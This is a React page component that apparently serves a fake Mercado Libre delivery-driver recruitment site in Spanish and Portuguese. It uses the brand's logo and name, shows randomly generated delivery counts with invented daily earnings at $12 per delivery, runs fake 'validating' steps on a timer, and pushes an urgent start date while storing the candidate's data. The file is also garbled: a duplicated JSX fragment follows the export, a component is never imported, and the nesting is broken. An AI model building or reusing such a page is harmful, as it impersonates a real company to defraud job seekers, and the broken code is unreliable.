import React, { useState, useEffect, useMemo } from 'react';
import { useLocation } from 'wouter';
import Header from '@/components/Header';
import Footer from '@/components/Footer';
import Breadcrumb from '@/components/Breadcrumb';
import { Button } from '@/components/ui/button';
import { Checkbox } from '@/components/ui/checkbox';
import { Card } from '@/components/ui/card';
import { Dialog, DialogContent, DialogDescription, DialogFooter } from '@/components/ui/dialog';
import { useToast } from '@/hooks/use-toast';
import { useAppContext } from '@/contexts/AppContext';
import { LoadingModal } from '@/components/LoadingModal';
import { useScrollTop } from '@/hooks/use-scroll-top';
import { GeolocationService, type Municipality } from '@/services/GeolocationService';

import municipiosPorEstado from '@/data/municipios-por-estado';

interface Municipio {
  nome: string;
  selecionado: boolean;
  entregas: number;
  distance?: number;
  state?: string;
}

const Municipios: React.FC = () => {
  // Aplica o scroll para o topo quando o componente é montado
  useScrollTop();
  
  const { cepData } = useAppContext();
  const [municipios, setMunicipios] = useState<Municipio[]>([]);
  const [loading, setLoading] = useState(true);
  const [submitting, setSubmitting] = useState(false);
  const [showLoadingModal, setShowLoadingModal] = useState(false);
  const [showStartDateModal, setShowStartDateModal] = useState(false);
  const [selectedStartDate, setSelectedStartDate] = useState<string | null>(null);
  const [selectedStates, setSelectedStates] = useState<string[]>([]);
  const [selectedMunicipios, setSelectedMunicipios] = useState<string[]>([]);
  const [nearbyMunicipalities, setNearbyMunicipalities] = useState<Municipality[]>([]);
  const [, navigate] = useLocation();
  const { toast } = useToast();

  // Estados do mapa de municipios estático (fallback para Brasil)
  const availableStates = useMemo(() => {
    return Object.keys(municipiosPorEstado);
  }, []);

  // Municipios baseados nos estados selecionados (Brasil) ou API (outros países)
  const availableMunicipios = useMemo(() => {
    // Se tivermos municípios da API (Chile e outros países), usar esses
    if (nearbyMunicipalities.length > 0) {
      return nearbyMunicipalities.map(m => m.city).sort();
    }
    
    // Fallback para Brasil usando dados estáticos
    if (selectedStates.length === 0) return [];
    
    const municipios: string[] = [];
    selectedStates.forEach(state => {
      if (municipiosPorEstado[state]) {
        municipios.push(...municipiosPorEstado[state]);
      }
    });
    
    return [...new Set(municipios)].sort();
  }, [selectedStates, nearbyMunicipalities]);

  // Buscar municípios próximos quando a página carregar (se não for Brasil)
  useEffect(() => {
    const loadNearbyMunicipalities = async () => {
      // Verificar se temos código postal no contexto ou localStorage
      const storedCep = localStorage.getItem('user_cep');
      const storedCountry = localStorage.getItem('user_country') || 'BR';
      
      console.log(`[DEBUG] CEP: ${storedCep}, País: ${storedCountry}`);
      
      // For testing: force Chilean data if none exists
      if (!storedCep && !storedCountry) {
        console.log('[DEBUG] No data found, checking for test scenario...');
      }
      
      // Se for Chile ou outro país (não Brasil), buscar via API
      if (storedCountry !== 'BR' && storedCep) {
        console.log(`[MUNICIPIOS] Carregando municípios para ${storedCountry} com código ${storedCep}`);
        
        try {
          const municipalities = await GeolocationService.getNearbyMunicipalities(
            storedCep, 
            storedCountry, 
            20 // raio de 20km para mais opções
          );
          
          console.log(`[MUNICIPIOS] API retornou ${municipalities.length} municípios:`, municipalities);
          setNearbyMunicipalities(municipalities);
          
          // Converter os municípios da API para o formato esperado pelo componente
          const getRandomEntregas = () => Math.floor(Math.random() * (48 - 32 + 1)) + 32;
          
          const municipiosFormatados = municipalities.map(municipality => ({
            nome: municipality.city,
            selecionado: false,
            entregas: getRandomEntregas(),
            distance: municipality.distance,
            state: municipality.state
          }));
          
          console.log(`[MUNICIPIOS] Municípios formatados para grid:`, municipiosFormatados);
          setMunicipios(municipiosFormatados);
          
        } catch (error) {
          console.error('[MUNICIPIOS] Erro ao carregar municípios próximos:', error);
          toast({
            title: "Erro",
            description: "Não foi possível carregar as cidades próximas.",
            variant: "destructive",
          });
        }
      } else {
        console.log(`[MUNICIPIOS] Brasil detectado ou CEP não disponível. Usando dados estáticos.`);
      }
    };

    loadNearbyMunicipalities();
  }, [toast]);

  useEffect(() => {
    const candidatoData = localStorage.getItem('candidato_data');
    const storedCountry = localStorage.getItem('user_country') || 'BR';
    
    if (!candidatoData || !cepData) {
      // Redirecionar para página inicial se não tiver os dados
      navigate('/');
      return;
    }

    // Para Brasil, carregar municípios do estado do usuário
    if (storedCountry === 'BR') {
      const estadoSigla = cepData.state;
      
      if (estadoSigla && municipiosPorEstado[estadoSigla as keyof typeof municipiosPorEstado]) {
        const getRandomEntregas = () => Math.floor(Math.random() * (48 - 32 + 1)) + 32;
        
        const municipiosDoEstado = municipiosPorEstado[estadoSigla as keyof typeof municipiosPorEstado].map((nome: string) => ({
          nome,
          selecionado: false, // Inicialmente nenhum selecionado
          entregas: getRandomEntregas() // Número aleatório de entregas entre 32 e 48
        }));
        
        setMunicipios(municipiosDoEstado);
      } else {
        // Caso não encontre os municípios (raro, mas pode acontecer)
        toast({
          title: "Error al cargar municipios",
          description: "No pudimos encontrar los municipios de tu estado.",
          variant: "destructive",
        });
      }
      
      setLoading(false);
    } else {
      // Para outros países, aguardar carregamento via API no outro useEffect
      console.log(`[MUNICIPIOS] País não-brasileiro detectado: ${storedCountry}. Aguardando carregamento via API.`);
      setLoading(false);
    }
  }, [cepData, navigate, toast]);

  const toggleAllMunicipios = () => {
    // Verificar se todos estão selecionados
    const allSelected = municipios.every(m => m.selecionado);
    
    // Inverter a seleção de todos
    setMunicipios(municipios.map(m => ({
      ...m,
      selecionado: !allSelected
    })));
  };

  const toggleMunicipio = (index: number) => {
    const newMunicipios = [...municipios];
    newMunicipios[index].selecionado = !newMunicipios[index].selecionado;
    setMunicipios(newMunicipios);
  };

  const handleLoadingComplete = () => {
    setShowLoadingModal(false);
    setShowStartDateModal(true);
  };
  
  const handleStartDateSelection = (date: string) => {
    setSelectedStartDate(date);
    localStorage.setItem('start_date', date);
  };
  
  const handleStartDateContinue = () => {
    if (selectedStartDate) {
      setShowStartDateModal(false);
      navigate('/recebedor');
    } else {
      toast({
        title: "Selección necesaria",
        description: "Por favor, selecciona una fecha para empezar.",
        variant: "destructive",
      });
    }
  };
  
  // Gerar datas para os próximos 3 dias
  const getNextThreeDays = () => {
    const days = ['Domingo', 'Lunes', 'Martes', 'Miércoles', 'Jueves', 'Viernes', 'Sábado'];
    const months = ['01', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12'];
    
    const dates = [];
    const today = new Date();
    
    for (let i = 1; i <= 3; i++) {
      const date = new Date();
      date.setDate(today.getDate() + i);
      
      const dayName = days[date.getDay()];
      const dayNumber = date.getDate();
      const monthNumber = months[date.getMonth()];
      
      dates.push({
        full: `${dayName} ${dayNumber}/${monthNumber}`,
        value: `${dayNumber}/${monthNumber}/2025`
      });
    }
    
    return dates;
  };

  const handleSubmit = () => {
    const municipiosSelecionados = nearbyMunicipalities.length > 0 
      ? selectedMunicipios 
      : municipios.filter(m => m.selecionado).map(m => m.nome);
    
    if (municipiosSelecionados.length === 0) {
      toast({
        title: "Selección necesaria",
        description: "Selecciona al menos un municipio para continuar.",
        variant: "destructive",
      });
      return;
    }

    setSubmitting(true);

    try {
      // Recuperar dados do candidato
      const candidatoData = JSON.parse(localStorage.getItem('candidato_data') || '{}');
      
      let municipiosComEntregas;
      
      if (nearbyMunicipalities.length > 0) {
        // Para municípios da API (Chile e outros países)
        municipiosComEntregas = selectedMunicipios.map(cityName => {
          const municipality = nearbyMunicipalities.find(m => m.city === cityName);
          return {
            nome: cityName,
            entregas: Math.floor(Math.random() * (48 - 32 + 1)) + 32,
            distance: municipality?.distance,
            state: municipality?.state
          };
        });
      } else {
        // Para Brasil (dados estáticos)
        municipiosComEntregas = municipios
          .filter(m => m.selecionado)
          .map(m => ({
            nome: m.nome,
            entregas: m.entregas
          }));
      }
      
      const dadosCompletos = {
        ...candidatoData,
        municipios: municipiosComEntregas,
        totalEntregas: municipiosComEntregas.reduce((acc, m) => acc + m.entregas, 0)
      };
      
      // Guardar dados completos
      localStorage.setItem('candidato_data_completo', JSON.stringify(dadosCompletos));
      
      // Mostrar modal de carregamento
      setShowLoadingModal(true);
      
    } catch (error) {
      toast({
        title: "Error en el registro",
        description: "Ocurrió un error al procesar tu información. Inténtalo de nuevo.",
        variant: "destructive",
      });
      setSubmitting(false);
    }
  };

  if (loading) {
    return (
      <div className="bg-[#FDE80F] min-h-screen flex flex-col">
        <Header />
        <div className="flex-grow container mx-auto px-4 py-8 flex items-center justify-center">
          <div className="text-center">
            <img 
              src="https://i.postimg.cc/j5Mnz0Tm/mercadolibre-logo-7-D54-D946-AE-seeklogo-com.png" 
              alt="Mercado Libre"
              className="h-16 w-auto object-contain mx-auto mb-6"
            />
            <div className="inline-block h-8 w-8 animate-spin rounded-full border-4 border-solid border-[#3483FA] border-r-transparent mb-4"></div>
            <p className="text-[#3483FA] font-loewe-next-body font-medium">Cargando municipios...</p>
          </div>
        </div>
        <Footer />
      </div>
    );
  }

  // Main UI that works for both API data and static data
  return (
    <div className="bg-[#FDE80F] min-h-screen flex flex-col">
      <Header />
      <Breadcrumb />
      <PageTitle title="Seleccionar Municipios" />
      <div className="container mx-auto px-4 py-8">
        <div className="max-w-4xl mx-auto">
          
          <div className="text-center mb-6">
            <h1 className="text-2xl font-bold text-gray-800 mb-2">Seleccionar Municipios Disponibles</h1>
            <p className="text-gray-600">
              {nearbyMunicipalities.length > 0 
                ? `Ciudades encontradas cerca de tu código postal (${nearbyMunicipalities.length} disponibles)`
                : 'Elige las zonas donde te gustaría realizar entregas'
              }
            </p>
          </div>

          {/* Show API-based municipalities if available */}
          {nearbyMunicipalities.length > 0 && (
            <>
              <Card className="p-4 bg-blue-50 border-blue-200 mb-6">
                <div className="flex items-center space-x-2 text-blue-800">
                  <i className="fas fa-map-marker-alt"></i>
                  <span className="font-medium">
                    Ciudades encontradas cerca de tu código postal
                  </span>
                </div>
                <p className="text-sm text-blue-600 mt-1">
                  Mostrando {nearbyMunicipalities.length} ciudades disponibles en un radio de 20km
                </p>
              </Card>

              <Card className="p-6 mb-6">
                <div className="flex items-center justify-between mb-4">
                  <h2 className="text-lg font-semibold text-gray-700">
                    Seleccionar Municipios ({nearbyMunicipalities.length})
                  </h2>
                  <span className="text-sm text-gray-500">
                    Ordenado por proximidad
                  </span>
                </div>
                
                <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3 max-h-96 overflow-y-auto">
                  {nearbyMunicipalities.map((municipality, index) => (
                    <div key={`${municipality.city}-${index}`} className="flex items-center space-x-2 p-3 hover:bg-gray-50 rounded border">
                      <Checkbox
                        id={`municipio-${municipality.city}-${index}`}
                        checked={selectedMunicipios.includes(municipality.city)}
                        onCheckedChange={(checked) => {
                          if (checked) {
                            setSelectedMunicipios([...selectedMunicipios, municipality.city]);
                          } else {
                            setSelectedMunicipios(selectedMunicipios.filter(m => m !== municipality.city));
                          }
                        }}
                        className="border-[#3483FA] data-[state=checked]:bg-[#3483FA]"
                      />
                      <div className="flex-1">
                        <label 
                          htmlFor={`municipio-${municipality.city}-${index}`} 
                          className="text-sm font-medium leading-none cursor-pointer block"
                        >
                          {municipality.city}
                        </label>
                        <div className="flex items-center space-x-2 mt-1">
                          {municipality.distance !== undefined && (
                            <span className="text-xs text-blue-600 bg-blue-100 px-2 py-1 rounded">
                              {municipality.distance.toFixed(1)} km
                            </span>
                          )}
                          {municipality.state && (
                            <span className="text-xs text-gray-500">
                              Región {municipality.state}
                            </span>
                          )}
                        </div>
                      </div>
                    </div>
                  ))}
                </div>
              </Card>

              {selectedMunicipios.length > 0 && (
                <Card className="p-4 bg-green-50 border-green-200 mb-6">
                  <div className="flex items-center justify-between">
                    <span className="text-green-800 font-medium">
                      Municipios seleccionados: {selectedMunicipios.length}
                    </span>
                    <span className="text-green-800 text-sm">
                      Entregas estimadas: {selectedMunicipios.length * 35}-{selectedMunicipios.length * 48}/día
                    </span>
                  </div>
                </Card>
              )}

              <div className="flex justify-between">
                <Button
                  variant="outline"
                  onClick={() => navigate('/cadastro')}
                  className="border-gray-300 text-gray-600 hover:bg-gray-50"
                >
                  Volver
                </Button>
                
                <Button
                  onClick={handleSubmit}
                  disabled={submitting || selectedMunicipios.length === 0}
                  className="bg-[#3483FA] hover:bg-blue-600 text-white"
                >
                  {submitting ? 'Procesando...' : 'Continuar'}
                </Button>
              </div>
            </>
          )}
        
        <Footer />
        
        {/* Modal de carregamento */}
        <LoadingModal
          isOpen={showLoadingModal}
          onComplete={handleLoadingComplete}
          title="Procesando Selección"
          loadingSteps={[
            "Validando municipios seleccionados",
            "Calculando rutas de entrega",
            "Analizando demanda regional",
            "Verificando disponibilidad de vacantes"
          ]}
          completionMessage="¡Municipios registrados con éxito!"
          loadingTime={12000}
        />
        
        {/* Modal de seleção de data de início */}
        <Dialog open={showStartDateModal} onOpenChange={setShowStartDateModal}>
          <DialogContent className="p-0 sm:max-w-none w-full h-full max-h-screen overflow-hidden border-none shadow-none bg-white">
            <div className="absolute top-0 left-0 w-full h-full bg-[#FDE80F] z-0"></div>
            
            <div className="relative flex flex-col justify-center items-center h-screen bg-transparent z-10 p-6 max-w-md mx-auto">
              <div className="mb-6">
                <img 
                  src="https://i.postimg.cc/j5Mnz0Tm/mercadolibre-logo-7-D54-D946-AE-seeklogo-com.png" 
                  alt="Mercado Libre"
                  className="h-14 w-auto object-contain"
                />
              </div>
              
              <h2 className="text-2xl font-bold text-[#3483FA] text-center mb-4">
                <i className="fas fa-exclamation-circle mr-2"></i>
                ¡Atención! Oportunidad de Trabajo
              </h2>
              
              <DialogDescription className="text-base text-center text-gray-700 py-3 mb-4 bg-[#F0F7FF] rounded-lg border border-[#3483FA20] p-4">
                En la región que elegiste, tenemos <span className="font-bold text-[#3483FA]">URGENTE</span> necesidad
                de nuevos repartidores, ya que la demanda de entregas está alta y tenemos pocos repartidores registrados.
              </DialogDescription>
              
              <div className="my-6 w-full">
                <h3 className="font-medium text-gray-800 mb-4 text-center text-lg">¿Cuándo puedes empezar?</h3>
                
                <div className="space-y-3">
                  {getNextThreeDays().map((date, index) => (
                    <Button
                      key={index}
                      onClick={() => handleStartDateSelection(date.value)}
                      variant={selectedStartDate === date.value ? "default" : "outline"}
                      className={`w-full h-12 text-left justify-start ${
                        selectedStartDate === date.value
                          ? 'bg-[#3483FA] text-white border-[#3483FA]'
                          : 'border-[#3483FA] text-[#3483FA] hover:bg-[#3483FA] hover:text-white'
                      }`}
                    >
                      <i className="fas fa-calendar-alt mr-3"></i>
                      {date.full}
                    </Button>
                  ))}
                </div>
              </div>

              <DialogFooter className="w-full">
                <Button
                  onClick={handleStartDateContinue}
                  disabled={!selectedStartDate}
                  className="w-full bg-[#3483FA] hover:bg-blue-600 text-white h-12"
                >
                  Continuar
                </Button>
              </DialogFooter>
            </div>
          </DialogContent>
        </Dialog>
        
        {/* Standard Brazilian municipalities grid - only show when not using API data */}
        {nearbyMunicipalities.length === 0 && (
          <>
            <div className="mb-4 flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4">
              <h2 className="text-lg sm:text-xl font-semibold text-gray-800">
                Marcar Municipios:
              </h2>
              <Button
                type="button"
                onClick={toggleAllMunicipios}
                variant="outline"
                className="bg-gray-50 hover:bg-gray-100 text-gray-700 border-gray-300 text-sm font-medium px-4 py-2"
              >
                {municipios.every(m => m.selecionado) ? 'Desmarcar Todos' : 'Marcar Todos'}
              </Button>
            </div>
            
            <div className="border rounded-[3px] overflow-hidden p-4 relative">
              <div className="max-h-[500px] overflow-y-auto custom-scrollbar">
                <div className="grid grid-cols-2 md:grid-cols-3 gap-3 sm:gap-4">
                  {municipios.map((municipio, index) => (
                    <div 
                      key={index} 
                      className={`p-2 sm:p-4 border rounded-[3px] cursor-pointer hover:bg-gray-50 transition-colors ${
                        municipio.selecionado ? 'border-[#3483FA] bg-[#F0F7FF]' : 'border-gray-200'
                      }`}
                      onClick={() => toggleMunicipio(index)}
                    >
                      <div className="flex items-center justify-between">
                        <div className="flex-1 min-w-0">
                          <span className="text-xs sm:text-sm font-medium text-gray-700 truncate block">
                            {municipio.nome}
                          </span>
                          {municipio.distance !== undefined && (
                            <span className="text-xs text-blue-600 bg-blue-100 px-1 py-0.5 rounded mt-1 inline-block">
                              {municipio.distance.toFixed(1)} km
                            </span>
                          )}
                        </div>
                        <Checkbox
                          checked={municipio.selecionado}
                          onCheckedChange={() => toggleMunicipio(index)}
                          className="h-4 w-4 sm:h-5 sm:w-5 border-gray-300 rounded data-[state=checked]:bg-[#3483FA] data-[state=checked]:text-white ml-2"
                        />
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            </div>
            
            {/* Estatísticas de entregas */}
            {municipios.filter(m => m.selecionado).length > 0 && (
              <Card className="mt-6 mb-6 p-4 border border-[#3483FA40] bg-[#F0F7FF]">
                <div className="flex flex-col">
                  <h3 className="font-medium text-gray-800 mb-2">Previsión de Entregas</h3>
                  <div className="text-sm text-gray-700">
                    <p>Cantidad promedio diaria de entregas que pueden ser asignadas a ti:</p>
                    <div className="mt-2 p-3 bg-white rounded-[3px] border border-[#3483FA20]">
                      <div className="text-center mb-3 bg-[#F0F7FF] p-2 rounded-[3px]">
                        <span className="font-medium text-[#3483FA]">Mercado Libre paga $12,00 (dólares) por entrega realizada</span>
                      </div>
                      
                      {municipios.filter(m => m.selecionado).map((m, index) => (
                        <div key={index} className="grid grid-cols-1 md:grid-cols-3 gap-2 mb-2 last:mb-0">
                          <span className="font-medium md:col-span-1">{m.nome}:</span>
                          <span className="font-bold text-[#3483FA] md:col-span-1">
                            {m.entregas} <span className="font-normal text-gray-700">entregas</span>
                          </span>
                          <span className="font-medium text-green-600 md:col-span-1">
                            ${(m.entregas * 12).toFixed(2).replace('.', ',')} <span className="font-normal text-gray-700">/día</span>
                          </span>
                        </div>
                      ))}
                      
                      {municipios.filter(m => m.selecionado).length > 1 && (
                        <div className="mt-3 pt-3 border-t border-[#3483FA20] grid grid-cols-1 md:grid-cols-3 gap-2">
                          <span className="font-semibold">Total diario:</span>
                          <span className="font-bold text-[#3483FA]">
                            {municipios
                              .filter(m => m.selecionado)
                              .reduce((acc, m) => acc + m.entregas, 0)} <span className="font-normal text-gray-700">entregas</span>
                          </span>
                          <span className="font-semibold text-green-600">
                            ${(municipios
                              .filter(m => m.selecionado)
                              .reduce((acc, m) => acc + m.entregas, 0) * 12).toFixed(2).replace('.', ',')} <span className="font-normal text-gray-700">/día</span>
                          </span>
                        </div>
                      )}
                    </div>
                  </div>
                </div>
              </Card>
            )}
            
            <div className="mt-6">
              <Button
                type="button"
                onClick={handleSubmit}
                className="w-full bg-[#3483FA] hover:bg-[#2968D7] text-white font-medium py-6 text-base rounded-[3px]"
                disabled={submitting}
                style={{ height: '50px' }}
              >
                {submitting ? 'Procesando...' : 'Continuar'}
              </Button>
            </div>
          </>
        )}
      </div>
      <Footer />
      <LoadingModal
        isOpen={showLoadingModal}
        onComplete={handleLoadingComplete}
        title="Procesando Selección"
        loadingSteps={[
          "Verificando municipios seleccionados",
          "Calculando rutas de entrega",
          "Analizando demanda regional",
          "Verificando disponibilidad de vacantes"
        ]}
        completionMessage="¡Municipios registrados con éxito!"
        loadingTime={12000}
      />
      {/* Modal de seleção de data de início */}
      <Dialog open={showStartDateModal} onOpenChange={setShowStartDateModal}>
        <DialogContent className="p-0 sm:max-w-none w-full h-full max-h-screen overflow-hidden border-none shadow-none bg-white">
          <div className="absolute top-0 left-0 w-full h-full bg-[#FDE80F] z-0"></div>
          
          <div className="relative flex flex-col justify-center items-center h-screen bg-transparent z-10 p-6 max-w-md mx-auto">
            {/* Mercado Libre Logo - positioned at top */}
            <div className="mb-6">
              <img 
                src="https://i.postimg.cc/j5Mnz0Tm/mercadolibre-logo-7-D54-D946-AE-seeklogo-com.png" 
                alt="Mercado Libre"
                className="h-14 w-auto object-contain"
              />
            </div>
            
            <h2 className="text-2xl font-bold text-[#3483FA] text-center mb-4">
              <i className="fas fa-exclamation-circle mr-2"></i>
              ¡Atención! Oportunidad de Trabajo
            </h2>
            
            <DialogDescription className="text-base text-center text-gray-700 py-3 mb-4 bg-[#F0F7FF] rounded-lg border border-[#3483FA20] p-4">
              En la región que elegiste, tenemos <span className="font-bold text-[#3483FA]">URGENTE</span> necesidad
              de nuevos repartidores, ya que la demanda de entregas está alta y tenemos pocos repartidores registrados.
            </DialogDescription>
            
            <div className="my-6 w-full">
              <h3 className="font-medium text-gray-800 mb-4 text-center text-lg">¿Cuándo puedes empezar?</h3>
              
              <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 mt-5">
                {getNextThreeDays().map((date, index) => (
                  <Button
                    key={index}
                    type="button"
                    variant={selectedStartDate === date.value ? "default" : "outline"}
                    onClick={() => handleStartDateSelection(date.value)}
                    className={`py-4 px-2 h-auto text-base ${selectedStartDate === date.value ? 'bg-[#3483FA] hover:bg-[#2968D7] border-[#3483FA] shadow-md' : 'border-gray-300 hover:border-[#3483FA] hover:text-[#3483FA]'}`}
                  >
                    {date.full}
                  </Button>
                ))}
              </div>
              
              <Button
                type="button"
                variant={selectedStartDate === 'outro' ? "default" : "outline"}
                onClick={() => handleStartDateSelection('outro')}
                className={`w-full mt-4 py-4 h-auto text-base ${selectedStartDate === 'outro' ? 'bg-[#3483FA] hover:bg-[#2968D7] border-[#3483FA] shadow-md' : 'border-gray-300 hover:border-[#3483FA] hover:text-[#3483FA]'}`}
              >
                Otro día
              </Button>
            </div>
            
            <div className="mt-6 w-full">
              <Button 
                type="button" 
                onClick={handleStartDateContinue}
                className="w-full bg-[#3483FA] hover:bg-[#2968D7] text-white font-medium text-lg py-6" 
                style={{ height: '60px' }}
                disabled={!selectedStartDate}
              >
                Continuar
              </Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
};

export default Municipios;
    <div className="bg-white min-h-screen flex flex-col">
      <Header />
      <Breadcrumb />
      <div className="flex-grow container mx-auto py-8 w-full">
        <div className="w-full mx-auto p-6 mb-8">
          <h1 className="text-2xl font-bold text-center mb-2 text-gray-800">Elige dónde recoger los pedidos</h1>
          <p className="text-center text-gray-600 mb-6">
            Selecciona las ciudades donde puedes recoger los pedidos en el Centro de distribución de Mercado Libre. En cada ciudad a continuación está ubicado un centro de distribución y según tu disponibilidad puedes elegir más de 1 centro para recoger los pedidos.
          </p>
          
          <div className="mb-4 flex justify-between items-center">
            <p className="text-sm font-medium text-gray-700">
              {cepData?.state ? `Estado: ${cepData.state}` : 'Estado no identificado'}
            </p>
            <Button 
              variant="outline" 
              type="button"
              onClick={toggleAllMunicipios}
              className="text-xs py-1 h-8"
            >
              {municipios.every(m => m.selecionado) ? 'Desmarcar Todos' : 'Marcar Todos'}
            </Button>
          </div>
          
          <div className="border rounded-[3px] overflow-hidden p-4 relative">
            <div className="max-h-[500px] overflow-y-auto custom-scrollbar">
              <div className="grid grid-cols-2 md:grid-cols-3 gap-3 sm:gap-4">
                {municipios.map((municipio, index) => (
                  <div 
                    key={index} 
                    className={`p-2 sm:p-4 border rounded-[3px] cursor-pointer hover:bg-gray-50 transition-colors ${
                      municipio.selecionado ? 'border-[#3483FA] bg-[#F0F7FF]' : 'border-gray-200'
                    }`}
                    onClick={() => toggleMunicipio(index)}
                  >
                    <div className="flex items-center justify-between">
                      <div className="flex-1 min-w-0">
                        <span className="text-xs sm:text-sm font-medium text-gray-700 truncate block">
                          {municipio.nome}
                        </span>
                        {/* Mostrar distância se disponível (para dados da API) */}
                        {municipio.distance !== undefined && (
                          <span className="text-xs text-blue-600 bg-blue-100 px-1 py-0.5 rounded mt-1 inline-block">
                            {municipio.distance.toFixed(1)} km
                          </span>
                        )}
                      </div>
                      <Checkbox
                        checked={municipio.selecionado}
                        onCheckedChange={() => toggleMunicipio(index)}
                        className="h-4 w-4 sm:h-5 sm:w-5 border-gray-300 rounded data-[state=checked]:bg-[#3483FA] data-[state=checked]:text-white ml-2"
                      />
                    </div>
                  </div>
                ))}
              </div>
            </div>
          </div>
          
          {/* Estatísticas de entregas */}
          {municipios.filter(m => m.selecionado).length > 0 && (
            <Card className="mt-6 mb-6 p-4 border border-[#3483FA40] bg-[#F0F7FF]">
              <div className="flex flex-col">
                <h3 className="font-medium text-gray-800 mb-2">Previsión de Entregas</h3>
                <div className="text-sm text-gray-700">
                  <p>Cantidad promedio diaria de entregas que pueden ser asignadas a ti:</p>
                  <div className="mt-2 p-3 bg-white rounded-[3px] border border-[#3483FA20]">
                    <div className="text-center mb-3 bg-[#F0F7FF] p-2 rounded-[3px]">
                      <span className="font-medium text-[#3483FA]">Mercado Libre paga $12,00 (dólares) por entrega realizada</span>
                    </div>
                    
                    {municipios.filter(m => m.selecionado).map((m, index) => (
                      <div key={index} className="grid grid-cols-1 md:grid-cols-3 gap-2 mb-2 last:mb-0">
                        <span className="font-medium md:col-span-1">{m.nome}:</span>
                        <span className="font-bold text-[#3483FA] md:col-span-1">
                          {m.entregas} <span className="font-normal text-gray-700">entregas</span>
                        </span>
                        <span className="font-medium text-green-600 md:col-span-1">
                          ${(m.entregas * 12).toFixed(2).replace('.', ',')} <span className="font-normal text-gray-700">/día</span>
                        </span>
                      </div>
                    ))}
                    
                    {municipios.filter(m => m.selecionado).length > 1 && (
                      <div className="mt-3 pt-3 border-t border-[#3483FA20] grid grid-cols-1 md:grid-cols-3 gap-2">
                        <span className="font-semibold">Total diario:</span>
                        <span className="font-bold text-[#3483FA]">
                          {municipios
                            .filter(m => m.selecionado)
                            .reduce((acc, m) => acc + m.entregas, 0)} <span className="font-normal text-gray-700">entregas</span>
                        </span>
                        <span className="font-semibold text-green-600">
                          ${(municipios
                            .filter(m => m.selecionado)
                            .reduce((acc, m) => acc + m.entregas, 0) * 12).toFixed(2).replace('.', ',')} <span className="font-normal text-gray-700">/día</span>
                        </span>
                      </div>
                    )}
                  </div>
                </div>
              </div>
            </Card>
          )}
          
          <div className="mt-6">
            <Button
              type="button"
              onClick={handleSubmit}
              className="w-full bg-[#3483FA] hover:bg-[#2968D7] text-white font-medium py-6 text-base rounded-[3px]"
              disabled={submitting}
              style={{ height: '50px' }}
            >
              {submitting ? 'Procesando...' : 'Continuar'}
            </Button>
          </div>
        </div>
      </div>
      <Footer />
      <LoadingModal
        isOpen={showLoadingModal}
        onComplete={handleLoadingComplete}
        title="Procesando Selección"
        loadingSteps={[
          "Verificando municipios seleccionados",
          "Calculando rutas de entrega",
          "Analizando demanda regional",
          "Verificando disponibilidad de vacantes"
        ]}
        completionMessage="¡Municipios registrados con éxito!"
        loadingTime={12000}
      />
      {/* Modal de seleção de data de início */}
      <Dialog open={showStartDateModal} onOpenChange={setShowStartDateModal}>
        <DialogContent className="p-0 sm:max-w-none w-full h-full max-h-screen overflow-hidden border-none shadow-none bg-white">
          <div className="absolute top-0 left-0 w-full h-full bg-[#FDE80F] z-0"></div>
          
          <div className="relative flex flex-col justify-center items-center h-screen bg-transparent z-10 p-6 max-w-md mx-auto">
            {/* Mercado Libre Logo - positioned at top */}
            <div className="mb-6">
              <img 
                src="https://i.postimg.cc/j5Mnz0Tm/mercadolibre-logo-7-D54-D946-AE-seeklogo-com.png" 
                alt="Mercado Libre"
                className="h-14 w-auto object-contain"
              />
            </div>
            
            <h2 className="text-2xl font-bold text-[#3483FA] text-center mb-4">
              <i className="fas fa-exclamation-circle mr-2"></i>
              ¡Atención! Oportunidad de Trabajo
            </h2>
            
            <DialogDescription className="text-base text-center text-gray-700 py-3 mb-4 bg-[#F0F7FF] rounded-lg border border-[#3483FA20] p-4">
              En la región que elegiste, tenemos <span className="font-bold text-[#3483FA]">URGENTE</span> necesidad
              de nuevos repartidores, ya que la demanda de entregas está alta y tenemos pocos repartidores registrados.
            </DialogDescription>
            
            <div className="my-6 w-full">
              <h3 className="font-medium text-gray-800 mb-4 text-center text-lg">¿Cuándo puedes empezar?</h3>
              
              <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 mt-5">
                {getNextThreeDays().map((date, index) => (
                  <Button
                    key={index}
                    type="button"
                    variant={selectedStartDate === date.value ? "default" : "outline"}
                    onClick={() => handleStartDateSelection(date.value)}
                    className={`py-4 px-2 h-auto text-base ${selectedStartDate === date.value ? 'bg-[#3483FA] hover:bg-[#2968D7] border-[#3483FA] shadow-md' : 'border-gray-300 hover:border-[#3483FA] hover:text-[#3483FA]'}`}
                  >
                    {date.full}
                  </Button>
                ))}
              </div>
              
              <Button
                type="button"
                variant={selectedStartDate === 'outro' ? "default" : "outline"}
                onClick={() => handleStartDateSelection('outro')}
                className={`w-full mt-4 py-4 h-auto text-base ${selectedStartDate === 'outro' ? 'bg-[#3483FA] hover:bg-[#2968D7] border-[#3483FA] shadow-md' : 'border-gray-300 hover:border-[#3483FA] hover:text-[#3483FA]'}`}
              >
                Otro día
              </Button>
            </div>
            
            <div className="mt-6 w-full">
              <Button 
                type="button" 
                onClick={handleStartDateContinue}
                className="w-full bg-[#3483FA] hover:bg-[#2968D7] text-white font-medium text-lg py-6" 
                style={{ height: '60px' }}
                disabled={!selectedStartDate}
              >
                Continuar
              </Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
};

export default Municipios;